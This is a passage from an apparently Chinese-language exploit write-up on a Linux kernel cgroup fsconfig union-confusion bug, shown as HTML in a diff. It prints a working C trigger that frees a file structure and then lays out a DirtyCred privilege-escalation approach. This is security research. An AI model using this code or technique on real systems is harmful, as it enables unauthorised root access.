class="hljs-literal">NULL</span>;<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> Opt_name:<br>		<span class="hljs-comment">/* blocked by boot param? */</span><br>		<span class="hljs-keyword">if</span> (cgroup_no_v1_named)<br>			<span class="hljs-keyword">return</span> -ENOENT;<br>		<span class="hljs-comment">/* Can&#x27;t specify an empty name */</span><br>		<span class="hljs-keyword">if</span> (!param-&gt;size)<br>			<span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Empty name&quot;</span>);<br>		<span class="hljs-keyword">if</span> (param-&gt;size &gt; MAX_CGROUP_ROOT_NAMELEN - <span class="hljs-number">1</span>)<br>			<span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Name too long&quot;</span>);<br>		<span class="hljs-comment">/* Must match [\w.-]+ */</span><br>		<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; param-&gt;size; i++) &#123;<br>			<span class="hljs-type">char</span> c = param-&gt;<span class="hljs-built_in">string</span>[i];<br>			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">isalnum</span>(c))<br>				<span class="hljs-keyword">continue</span>;<br>			<span class="hljs-keyword">if</span> ((c == <span class="hljs-string">&#x27;.&#x27;</span>) || (c == <span class="hljs-string">&#x27;-&#x27;</span>) || (c == <span class="hljs-string">&#x27;_&#x27;</span>))<br>				<span class="hljs-keyword">continue</span>;<br>			<span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;Invalid name&quot;</span>);<br>		&#125;<br>		<span class="hljs-comment">/* Specifying two names is forbidden */</span><br>		<span class="hljs-keyword">if</span> (ctx-&gt;name)<br>			<span class="hljs-keyword">return</span> invalfc(fc, <span class="hljs-string">&quot;name respecified&quot;</span>);<br>		ctx-&gt;name = param-&gt;<span class="hljs-built_in">string</span>;<br>		param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>调用链可以确定下来</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">sys_fsconfig</span>()<br>	<span class="hljs-built_in">vfs_fsconfig_locked</span>()<br>		<span class="hljs-built_in">vfs_parse_fs_param</span>()<br>			fc-&gt;ops-&gt;<span class="hljs-built_in">parse_param</span>(cgroup1_parse_param)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>到此我们具备了创建一个挂载实例的所有准备工作，下一步就是创建一个挂载实例</p>
+<p>创建一个挂载实例需要使用<code>fsmount()</code></p>
+<h2 id="fsmount"><a href="#fsmount" class="headerlink" title="fsmount"></a>fsmount</h2><p>这个fsmount创建一个挂载实例后关联到一个新的文件描述符，这个新的文件描述符以<strong>O_PATH</strong>打开。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>下面就是最后一步了，我们得到了一个挂载实例，下面就是将这个挂载实例<code>attach</code>到挂载点上。这一步使用<code>move_mount()</code>系统调用。</p>
+<h2 id="move-mount"><a href="#move-mount" class="headerlink" title="move_mount"></a>move_mount</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">move_mount</span><span class="hljs-params">(<span class="hljs-type">int</span> from_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *from_pathname,</span><br><span class="hljs-params">			     <span class="hljs-type">int</span> to_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *to_pathname,</span><br><span class="hljs-params">			     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> syscall(__NR_move_mount,<br>		       from_dfd, from_pathname,<br>		       to_dfd, to_pathname, flags);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x03：漏洞分析"><a href="#0x03：漏洞分析" class="headerlink" title="0x03：漏洞分析"></a>0x03：漏洞分析</h1><p>再来看一眼<code>fs_parameter</code>这个结构体，问题出在中间这个<code>union</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> &#123;</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>              *key;           <span class="hljs-comment">/* Parameter name */</span><br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_value_type</span>      <span class="hljs-title">type</span>:</span><span class="hljs-number">8</span>;         <span class="hljs-comment">/* The type of value here */</span><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-type">char</span>            *<span class="hljs-built_in">string</span>;<br>                <span class="hljs-type">void</span>            *blob;<br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">filename</span> *<span class="hljs-title">name</span>;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span>     *<span class="hljs-title">file</span>;</span><br>        &#125;;<br>        <span class="hljs-type">size_t</span>  size;<br>        <span class="hljs-type">int</span>     dirfd;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>在<code>sys_fsconfig</code>中，当<strong>CMD</strong>为<strong>FSCONFIG_SET_FD</strong>时，会有如下操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>		param.type = fs_value_is_file;<br>		ret = -EBADF;<br>		param.file = fget(aux);<br>		<span class="hljs-keyword">if</span> (!param.file)<br>			<span class="hljs-keyword">goto</span> out_key;<br>		<span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>
+
+<p>此时<code>param.file</code>通过文件描述符指向一个文件实例</p>
+<p>但是在接下来的调用链，<code>cgroup1_parse_param</code>中，当<code>key</code>为<code>source</code>时，会把<code>param-&gt;string</code>赋值给<code>fc-&gt;source</code>，</p>
+<p>但是由于<code>param</code>结构体中，<code>string</code>和<code>file</code>是个<code>union</code>，两者只能存在一个，所以此处存在把文件实例传递给<code>fc-&gt;source</code>的风险</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br>	<span class="hljs-keyword">if</span> (opt == -ENOPARAM) &#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>			fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>			param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>		&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来，若我们关闭文件描述符<code>fscontext_fd</code>，则会调用到<code>fscontext_fops</code>中的<code>fscontext_release</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fscontext_fops</span> =</span> &#123;<br>	.read		= fscontext_read,<br>	.release	= fscontext_release,<br>	.llseek		= no_llseek,<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>在<code>fscontext_release</code>中会调用<code>put_fs_context</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fscontext_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span> =</span> file-&gt;private_data;<br><br>	<span class="hljs-keyword">if</span> (fc) &#123;<br>		file-&gt;private_data = <span class="hljs-literal">NULL</span>;<br>		put_fs_context(fc);<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在<code>put_fs_context</code>会释放<code>fc-&gt;source</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * put_fs_context - Dispose of a superblock configuration context.</span><br><span class="hljs-comment"> * @fc: The context to dispose of.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">put_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">super_block</span> *<span class="hljs-title">sb</span>;</span><br><br>	<span class="hljs-keyword">if</span> (fc-&gt;root) &#123;<br>		sb = fc-&gt;root-&gt;d_sb;<br>		dput(fc-&gt;root);<br>		fc-&gt;root = <span class="hljs-literal">NULL</span>;<br>		deactivate_super(sb);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (fc-&gt;need_free &amp;&amp; fc-&gt;ops &amp;&amp; fc-&gt;ops-&gt;<span class="hljs-built_in">free</span>)<br>		fc-&gt;ops-&gt;<span class="hljs-built_in">free</span>(fc);<br><br>	security_free_mnt_opts(&amp;fc-&gt;security);<br>	put_net(fc-&gt;net_ns);<br>	put_user_ns(fc-&gt;user_ns);<br>	put_cred(fc-&gt;cred);<br>	put_fc_log(fc);<br>	put_filesystem(fc-&gt;fs_type);<br>	kfree(fc-&gt;source);<br>	kfree(fc);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>若之前将<code>fc-&gt;source</code>指向一个文件实例，那么在此处释放后，该实例事实上还在使用中</p>
+<p>可以关闭与之关联的文件描述符造成<code>double free</code></p>
+<p>可以写个小demo测试一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> tmp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fscontext_fd;<br>    fscontext_fd = syscall(__NR_fsopen, <span class="hljs-string">&quot;cgroup&quot;</span>, FSOPEN_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (fscontext_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;fsopen failed!&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd_null = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd_null &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open /dev/null failed!&quot;</span>);<br><br>    syscall(__NR_fsconfig, fscontext_fd, FSCONFIG_SET_FD, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-literal">NULL</span>, fd_null);<br>    close(fscontext_fd);<br><br>    tmp = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDONLY);<br><br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到在<code>put_fs_context</code>中是释放的是<code>0xffff888005f59c00</code>的堆块</p>
+<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/f04ac0e24d6468fdac631d981d05e09.png" srcset="/img/loading.gif" lazyload></p>
+<p>在接下打开&#x2F;<code>dev/ptmx</code>过程中，发现重新申请回来的file结构体和之前的释放的堆块相同</p>
+<p>但是此时<code>fd_null</code>并未关闭，于是，此时是<code>/dev/null</code>和&#x2F;<code>dev/ptmx</code>共用一个file</p>
+<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/b05d5310f1ef2e669c3cfa814e69ce4.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="0x04：漏洞利用——dirtycred！！！"><a href="#0x04：漏洞利用——dirtycred！！！" class="headerlink" title="0x04：漏洞利用——dirtycred！！！"></a>0x04：漏洞利用——dirtycred！！！</h1><p>于此处实践一下<strong>dirtycred</strong>这一手法</p>
+<p>根据漏洞，可以造成一个<code>file</code>凭证的<code>UAF</code>，步骤如下：</p>
+<ol>
+<li>当在用户态打开一个文件时，内核会分配一个<code>file</code>结构体，用来保存文件的信息</li>
+<li>利用<code>fsopen</code>打开一个文件系统，使用<code>fsconfig</code>可以指定已经打开的文件和文件系统</li>
+<li><code>fsconfig</code>中存在参数解析漏洞，倒是关闭文件系统时，会造成<code>file</code>结构体的释放，形成<strong>UAF</strong>漏洞</li>
+<li>接下来不断得打开文件，可以分配到被释放得<code>file</code>结构，此时，存在两个文件描述符指向同一个<code>file</code>结构体</li>
+</ol>
+<p>下图来自blingbling师傅的blog呜呜</p>
+<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405163727.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据<strong>dirtycred</strong>的思路，在文件检查和实际写入间隙，将<code>file</code>结构体替换成无写入权限的特权文件</p>
+<p>一般来说，<code>write</code>的函数调用链为</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">sys_write</span>()<br>	<span class="hljs-built_in">ksys_write</span>()<br>		<span class="hljs-built_in">vfs_write</span>()<br>			new_sync_write <br>				call_write_iter <br>					file-&gt;f_op-&gt;write_iter<br></code></pre></td></tr></table></figure>
+
+<p><strong>vfs_write</strong></p>
+<p>在<code>vfs_write</code>中，会check将要写入的文件是否具有可写入权限</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vfs_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>	<span class="hljs-type">ssize_t</span> ret;<br><br>	<span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))			<span class="hljs-comment">//check</span><br>		<span class="hljs-keyword">return</span> -EBADF;<br>	<span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))		<span class="hljs-comment">//check</span><br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	<span class="hljs-keyword">if</span> (unlikely(!access_ok(buf, count)))<br>		<span class="hljs-keyword">return</span> -EFAULT;<br><br>	ret = rw_verify_area(WRITE, file, pos, count);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br>	<span class="hljs-keyword">if</span> (count &gt; MAX_RW_COUNT)<br>		count =  MAX_RW_COUNT;<br>	file_start_write(file);<br>	<span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write)<br>		ret = file-&gt;f_op-&gt;write(file, buf, count, pos);<br>	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write_iter)<br>		ret = new_sync_write(file, buf, count, pos);<br>	<span class="hljs-keyword">else</span><br>		ret = -EINVAL;<br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>		fsnotify_modify(file);<br>		add_wchar(current, ret);<br>	&#125;<br>	inc_syscw(current);<br>	file_end_write(file);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在不同的文件系统中，<code>file-&gt;f_op-&gt;write_iter</code>不同，常见中的<strong>ext4</strong>系统中对应的是<code>ext4_buffered_write_iter</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">ext4_buffered_write_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb,</span><br><span class="hljs-params">					<span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br>	<span class="hljs-type">ssize_t</span> ret;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);<br><br>	<span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_NOWAIT)<br>		<span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><br>	inode_lock(inode);						<span class="hljs-comment">//此处便会对写入的进程加锁，同一时间内只允许一个进程进行写入操作</span><br>	ret = ext4_write_checks(iocb, from);<br>	<span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> out;<br><br>	ret = generic_perform_write(iocb, from);<br><br>out:<br>	inode_unlock(inode);<br>	<span class="hljs-keyword">if</span> (unlikely(ret &lt;= <span class="hljs-number">0</span>))<br>		<span class="hljs-keyword">return</span> ret;<br>	<span class="hljs-keyword">return</span> generic_write_sync(iocb, ret);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>下图也是来自blingbling师傅的blog</p>
+<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240406133530.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是，这个时间窗口非常小。且一般常用的<strong>userfaultfd</strong>在<strong>5.11</strong>版本及以后，无法在<strong>非root</strong>权限下使用，而代替userfaultfd的<strong>FUSE</strong>笔者还8会。便采用了向文件写入大量data这一方法——因为文件系统不允许两个进程同时写同一个文件，假设进程A&#x2F;B同时对同一文件写入，进程A先获取锁，写入大量数据（1G文件大概要写2-3秒，可以说是很长的时间窗口了），进程B在完成check后等待获取锁，那么这中间的时间就可以替换<code>file</code>结构体</p>
+<p>下图还是来自blingbling师傅的blog</p>
+<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240406133603.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>PS1：fsopen和fsconfig只用在root权限下才可使用，所以需要开辟新的命名空间来绕过该限制</strong></p>
+<p><strong>PS2：对将要打开的普通权限文件创建一个链接</strong></p>
+<p>在<code>ksys_write</code>中，会调用到<code>fdget_pos</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">ksys_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_pos(fd);<br>	<span class="hljs-type">ssize_t</span> ret = -EBADF;<br>.......<br></code></pre></td></tr></table></figure>
+
+<p><code>fdget_pos</code>是<code>__fdget_pos</code>的套娃</p>
+<p>如果<code>file_needs_f_pos_lock(file)</code>返回值为<code>true</code>，那么这个线程就会被上锁，但是此时还没过<code>file</code>权限check呢，这显然是我们不想看到的，那该怎么办呢？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __fdget_pos(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd)<br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v = __fdget(fd);<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> (<span class="hljs-keyword">struct</span> file *)(v &amp; ~<span class="hljs-number">3</span>);<br><br>	<span class="hljs-keyword">if</span> (file &amp;&amp; file_needs_f_pos_lock(file)) &#123;<br>		v |= FDPUT_POS_UNLOCK;<br>		mutex_lock(&amp;file-&gt;f_pos_lock);<br>	&#125;<br>	<span class="hljs-keyword">return</span> v;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到如果<code>file-&gt;f_mode</code>带有 <strong>FMODE_ATOMIC_POS</strong>这个标志，那这个返回值为1</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Try to avoid f_pos locking. We only need it if the</span><br><span class="hljs-comment"> * file is marked for FMODE_ATOMIC_POS, and it can be</span><br><span class="hljs-comment"> * accessed multiple ways.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Always do it for directories, because pidfd_getfd()</span><br><span class="hljs-comment"> * can make a file accessible even if it otherwise would</span><br><span class="hljs-comment"> * not be, and for directories this is a correctness</span><br><span class="hljs-comment"> * issue, not a &quot;POSIX requirement&quot;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">file_needs_f_pos_lock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> (file-&gt;f_mode &amp; FMODE_ATOMIC_POS) &amp;&amp;<br>		(file_count(file) &gt; <span class="hljs-number">1</span> || file-&gt;f_op-&gt;iterate_shared);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>what is FMODE_ATOMIC_POS?</strong></p>
+<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405214853.png" srcset="/img/loading.gif" lazyload style="zoom:50%;" />
+
+<p>源码搜索发现<code>open</code>中也调用到了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br><span class="hljs-comment">/* POSIX.1-2008/SUSv4 Section XSI 2.9.7 */</span><br>	<span class="hljs-keyword">if</span> (S_ISREG(inode-&gt;i_mode) || S_ISDIR(inode-&gt;i_mode))<br>		f-&gt;f_mode |= FMODE_ATOMIC_POS;<br>......<br></code></pre></td></tr></table></figure>
+
+<p>那<strong>S_ISREG</strong>和<strong>S_ISDIR</strong>又为何物？</p>
